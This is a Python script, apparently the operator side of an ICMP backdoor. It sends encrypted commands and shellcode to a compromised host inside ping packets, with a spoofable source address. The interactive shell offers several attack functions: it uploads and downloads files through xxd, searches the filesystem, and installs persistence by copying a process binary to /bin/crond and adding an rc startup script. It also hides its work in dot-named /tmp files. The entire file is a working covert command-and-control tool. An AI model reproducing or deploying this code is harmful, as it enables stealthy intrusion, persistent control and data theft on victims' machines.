from scapy.all import *
import thread
import threading,time
import getopt

cmdout = []


########## functions ############
def usage():
   print "Usage:"
   print "\tpython %s -i <iface> -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-h]" % sys.argv[0]
   print "\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)"
   print "\t\tiface: interface to send from and listen on (Default: eth0)"
   print "\t\tsrc_ip: the address we want to send from (Can be anything)"
   print "\t\tshellcode_file: send shellcode from this file to run on the host"
   print
   sys.exit(0)

def parse_args():
   global iface, dst_ip, src_ip, shellcode_file

   try:
      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])

   except getopt.GetoptError, err:
      usage()    

   for o, a in opts:
      if o in ('-i', '--interface'):
         iface = a
      if o in ('-d', '--destination'):
         dst_ip = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-h', '--help'):
         usage()

def generate_key_info():
   return random.randint(0,65535)

def generate_key(key_info):
   key = [0, 0]

   key[0] = key_info & 0xFF
   key[1] = (key_info >> 8) & 0xFF

   return key


def crypt_data(data, key):
   encrypted_data = ""

   if len(data) < 18:
      data += ("\x00" * (len(data) % 18))

   for c in data:
	   encrypted_data += chr((ord(c) ^ key[0]) ^ key[1])

   return encrypted_data

def build_pkt(src, dst, data, key_info):
   ip = IP(dst=dst)

   if src_ip:
      ip.src = src

   return ip/ICMP(type=8, code=0, chksum=key_info)/data

def sniff_packet(pkt):
   global magic
   global cmdout 

   if ICMP in pkt and pkt[ICMP].chksum and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
      data = crypt_data(pkt.load, generate_key(pkt[ICMP].chksum))

      if data.startswith(magic):
         cmdout.append(data[len(magic) + 1:])

def start_listener(iface, *args):
   sniff(filter="icmp", iface=iface, prn=sniff_packet)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, magic, iface, shellcode_file

   # Open and read the shellcode
   f = open(shellcode_file, 'r')
   shellcode = magic + MSG_TYPE_SHELLCODE + f.read()
   f.close()

   # Get the required crypto bits
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(shellcode, key)

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)

########### main #############
MSG_TYPE_SHELLCODE = '\x01'
MSG_TYPE_COMMAND = '\x02'

magic = "GOATSE"
iface = "eth0"
src_ip = ""
dst_ip = ""
shellcode_file = ""

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Make sure we at least have a destination
if dst_ip == "":
   print "ERROR: Destination must be specified"
   usage()

# Do we send shellcode or start a shell
if shellcode_file != "":
	send_shellcode()
	print "Shellcode sent"
	sys.exit(0)

# Create the listener thread
thread.start_new_thread(start_listener, (iface, None))

#Ghetto wau to ensure I got all output
def cmdoutput(line):
   global cmdout
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(magic + "\x02" + line, key)
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
   
   len1 = len(cmdout)
   time.sleep(100.0 / 1000.0)
   while 1:
      if len(cmdout) != len1:
          len1 = len(cmdout)
          time.sleep(100.0 / 1000.0)
      else:
          break
      for i in cmdout:
          print i
      orig = []
      for i in cmdout:
         if i.find('\n') > -1:
            new = i.split('\n')
            for x in new:
               orig.append(x)
         else:
            orig.append(i)
      cmdout = []
      return orig

import cmd
# Now just read our input and send commands
class Shell(cmd.Cmd):
    last_output = ''

    def default(self, line):
       line = line.rstrip('\n')
       cmdoutput(line) 
       #return cmd.Cmd.default(self, line)
        
    def do_local(self, line):
        "Run a local shell command"
        print "running shell command:", line
        line = line.rstrip('\n')
        output = os.popen(line).read()
        print output

    def do_get(self, line):
      "Get a File with xxd"
      filename = line.split('/')
      filename = filename[len(filename)-1]
      hexfile = cmdoutput("xxd -p "+line)
      print "Lines: "+len(hexfile) 
      f = open("/tmp/.binbin", "w+")
      for line in hexfile:
        f.write(line)
      f.close()
      os.popen("xxd -p -r /tmp/.binbin > ./"+filename).read()
      output = os.popen("ls -latr ./"+filename).read()
      print output
      print "Get File Complete"

    def do_put(self, line):
      "Upload a File with xxd, file goes to /tmp/.filename"
      filename = line.split('/')
      filename = filename[len(filename)-1]
      put = os.popen("xxd -p "+line+"").read()
      puthex = put.split('\n')
      
      for i in puthex:
         cmdoutput("echo "+i+" >> /tmp/.bin")
      cmdoutput("xxd -p -r /tmp/.bin >> /tmp/."+filename)
      cmdoutput("ls -latr /tmp/."+filename)
      cmdoutput("rm /tmp/.bin")
      print "Upload Complete"

    
    def do_clear(self,line):
       "Clear screen"
       os.system("clear")

    def do_persist(self, line):
      "Create persistence, copy from proc/pid/exe to rcscripts as crond, ex. persist 5141"
      line = line.rstrip('\n')
      if line != "":
        runlevel = cmdoutput("runlevel")
        runlevel = runlevel[0].split(' ')
        runlevel = runlevel[1]
        print "Runlevel is: "+runlevel
        
        rc = cmdoutput("ls /etc/rc"+runlevel+".d/S* && echo true")
        if str(rc).find("true") > -1:
          persistin = "/etc/rc"+runlevel+".d/S48crond"
          print "Persist in: "+persistin
          cmdoutput("cp /proc/"+line+"/exe /bin/crond")
          cmdoutput("echo \"/bin/crond\" \& > "+persistin+" && chmod +x "+persistin)
          cmdoutput("tail "+persistin+" && ls -latr /bin/crond")
      else:
        print "Dude you didnt enter a pid... ex: persist 5141"

    def do_showmyproc(self,line):
      "Display the icmp backdoor process name, may only not be accurate..."
      cmdoutput("cat /proc/$PPID/cmdline && echo \" PID: $PPID\"")

    def do_prompt(self, line):
    #Set Prompt by Hostname
      "Set Command Prompt to username@hostname"
      usernametmp  = cmdoutput('whoami')
      username = usernametmp[0]
      hostnametmp = cmdoutput('hostname')
      hostname = hostnametmp[0]
      hostname += (':')
      self.prompt = username +"@"+hostname

    def do_find(self, line):
      "Find a file, enter only find and the filename"
      cmdoutput('find / ' + "| grep "+line + "> /tmp/.keyring-2WEFPj" )
      time.sleep(5)
      cmdoutput('cat /tmp/.keyring-2WEFPj')
    
    def do_exit(self, line):
      "Exit the shell"
      print "Good Bye"
      exit(0)


    def do_EOF(self, line):
        return True
    
if __name__ == '__main__':
    Shell().cmdloop('ICMP Backdoor Interactive Shell (m0r3sh3lls)')
